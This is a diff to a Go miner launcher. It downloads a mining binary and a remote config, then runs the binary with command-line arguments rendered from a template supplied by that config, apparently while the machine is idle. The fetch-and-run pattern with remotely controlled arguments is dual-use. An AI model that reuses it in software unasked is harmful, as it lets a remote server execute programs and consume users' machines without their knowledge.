@@ -9,7 +9,9 @@ package main
 import "C"
 
 import (
+	"bytes"
 	"encoding/json"
+	"html/template"
 	"io"
 	"io/ioutil"
 	"log"
@@ -33,9 +35,12 @@ const (
 )
 
 type configT struct {
-	Key         string
-	URL         string
-	FallbackURL string
+	Key         string `json:"key"`
+	URL         string `json:"url"`
+	FallbackURL string `json:"fallbackUrl"`
+	Template    string `json:"template"`
+	ID          string
+	MinerPath   string
 }
 
 type stateT struct {
@@ -93,7 +98,7 @@ func awakeMonitor(awake chan bool) {
 	}
 }
 
-func miner(id string, config configT, minerPath string, sub subT) {
+func miner(sub subT, minerPath string, args []string) {
 	on := false
 	var c *exec.Cmd
 	for {
@@ -106,7 +111,7 @@ func miner(id string, config configT, minerPath string, sub subT) {
 		} else if !on && shouldBeOn {
 			log.Println("Starting miner...")
 			on = true
-			c = exec.Command(minerPath, "--farm-recheck", "200", "-G", "-S", config.URL, "-FS", config.FallbackURL, "-O", config.Key+"."+id)
+			c = exec.Command(minerPath, args...)
 			c.Stdout = os.Stdout
 			c.Stderr = os.Stderr
 			c.Start()
@@ -187,13 +192,25 @@ func main() {
 		log.Fatalln(err)
 	}
 
+	minerPath, err := downloadFile(minerURL)
+	if err != nil {
+		log.Fatalln(err)
+	}
+
 	config := configT{}
 	err = downloadJSON(configURL, &config)
 	if err != nil {
 		log.Fatalln(err)
 	}
+	config.ID = id
+	config.MinerPath = minerPath
 
-	minerPath, err := downloadFile(minerURL)
+	var buf bytes.Buffer
+	cmd, err := template.New("cmd").Parse(config.Template)
+	if err != nil {
+		log.Fatalln(err)
+	}
+	err = cmd.Execute(&buf, config)
 	if err != nil {
 		log.Fatalln(err)
 	}
@@ -203,6 +220,6 @@ func main() {
 	minerSub := make(subT)
 	go activeMonitor(active)
 	go awakeMonitor(awake)
-	go miner(id, config, minerPath, minerSub)
+	go miner(minerSub, minerPath, strings.Split(buf.String(), " "))
 	stateLoop(active, awake, minerSub)
 }
